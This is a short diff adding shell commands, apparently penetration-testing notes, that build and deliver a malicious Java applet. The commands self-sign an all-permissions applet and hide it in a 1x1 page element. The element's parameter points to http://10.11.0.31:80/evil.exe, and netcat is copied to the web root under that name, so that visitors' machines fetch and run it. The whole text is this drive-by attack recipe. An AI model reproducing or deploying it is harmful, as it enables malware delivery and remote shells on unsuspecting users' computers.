@@ -1,0 +1,10 @@
+## Compile java applet
+javac -source 1.7 -target 1.7 Java.java
+echo "Permissions: all-permissions" > /root/manifest.txt
+jar cvf Java.jar Java.class
+keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
+jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
+
+## embed in html and serve
+echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.31:80/evil.exe"></applet>' > /var/www/html/java.html
+cp nc.exe /var/www/html/evil.exe
